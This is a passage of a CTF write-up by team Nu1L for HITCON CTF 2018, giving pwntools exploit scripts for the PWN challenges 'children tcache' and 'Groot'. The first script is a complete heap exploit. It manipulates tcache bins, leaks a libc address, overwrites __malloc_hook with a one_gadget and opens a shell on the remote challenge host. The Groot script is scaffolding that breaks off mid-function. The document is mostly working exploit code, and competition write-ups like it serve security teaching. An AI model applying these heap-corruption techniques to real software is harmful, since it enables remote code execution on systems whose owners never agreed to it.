# 2018 hitcon CTF
> By Nu1L
比赛网址：  
比赛时间：2018/10/20 02:00 UTC ~ 2018/10/22 02:00 UTC
* * *
## PWN
### children tcache
    from pwn import *
    #p=process('./child',env={'LD_PRELOAD':'./libc.so.6'})
    p=remote('54.178.132.125', 8763)
    libc = ELF('./libc.so.6')
    def add(size,data):
        p.recvuntil('choice')
        p.sendline('1')
        p.recvuntil('Size:')
        p.sendline(str(size))
        p.recvuntil('Data:')
        p.send(data)
    def dele(index):
        p.recvuntil('choice')
        p.sendline('3')
        p.recvuntil('Index')
        p.sendline(str(index))
    for i in range(7):
        add(0x80,'xxx\n')
    for i in range(7):
        dele(i)
    for i in range(7):
        add(0x110-8,'xxx\n')
    add(0x110-8,'aaaa\n')#7
    add(0x100,'bbbb\n')#8
    add(0x100,'cccc\n')#9
    for i in range(7):
        dele(i)
    dele(8)
    dele(7)
    #raw_input()
    for i in range(7):
        add(0x110-8,'aaaa\n') #0-6
    add(0x110-8,'a'*(0x110-8))#7
    for i in range(7):
        dele(i)
    #raw_input()
    for i in range(7):
        add(0x80,'1234567\n')#0-6
    add(0x80,'xxxxxxxx\n')#8
    for i in range(7):
        dele(i)
    add(0x60,'ABCD\n')#0
    dele(8)
    dele(9)
    add(0x40,'a\n')#1
    add(0x30,'b\n')#2
    add(0x500,'aaaa\n')#3
    add(0x120,'bbbb\n')#4
    #0,3->same chunk
    dele(3)
    p.recvuntil('choice')
    p.sendline('2')
    p.recvuntil("Index:")
    p.sendline('0')
    addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = addr - (0x00007f2e9c12dca0-0x7f2e9bd42000)
    info("libc:0x%x",libc_base)
    malloc_hook = libc_base+libc.symbols['__malloc_hook']
    info("malloc hook:0x%x",malloc_hook)
    one = libc_base + 0x10a38c
    add(0x500,'aaaaa\n')#3
    dele(3)
    add(0x120,'ABCDABCD\n')
    dele(4)
    dele(3)
    dele(0)
    add(0x120,p64(malloc_hook)+'\n')
    add(0x120,p64(one)+'\n')
    add(0x120,p64(one)+'\n')
    p.sendline('1')
    p.sendline('304')
    p.interactive()
### Groot
指针未初始化
    #!/usr/bin/env python2
    # coding:utf-8
    from pwn import *
    import os
    VERBOSE = 1
    DEBUG   = 1
    LOCAL   = 0
    target = 'groot'
    libc   = []         # 加载指定libc
    break_points = []
    remote_addr = '54.238.202.201'
    remote_port = 31733
    def hint(break_points=[]):
        if LOCAL:
            out = 'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
            for bp in break_points:
                out += " -ex 'b *{}'".format(hex(bp))
            raw_input(out+" -ex 'c'\n" if break_points else out+"\n") 
    # if libc:
    #     elf = ELF(libc[0])
    #     gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))
    if LOCAL:
        if libc:
            for libc_ in libc:
                os.environ['LD_PRELOAD'] = os.environ['PWD'] + '/' + libc_ + ':'
        p = process('./'+target)
        if DEBUG:
            out =  'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
            for bp in break_points:
                out += " -ex 'b *{}'".format(hex(bp))
            raw_input(out+" -ex 'c'\n" if break_points else out+"\n")
    else:
        p = remote(remote_addr,remote_port)
    if VERBOSE: context.log_level = 'DEBUG'
    def mkdir(dir):
        p.sendlineafter('$ ','mkdir '+dir)
    def touch(name):
        p.sendlineafter('$ ','touch '+name)
    def rm(name):
        p.sendlineafter('$ ','rm '+name)
    def mkfile(name, content):
        p.sendlineafter('$ ','mkfile '+name)
        p.sendlineafter('Content?', content)
    def cd(dir):
        p.sendlineafter('$ ','cd '+dir)
    def ls(dir):
        if dir:
            p.sendlineafter('$ ','ls '+dir)
        else:
            p.sendlineafter('$ ','ls')
    def mv(src, dst):
        p.sendlineafter('$ ','mv %s %s' %(src,dst))
    def exp(cmd=None):
        mkdir('A'*0x30)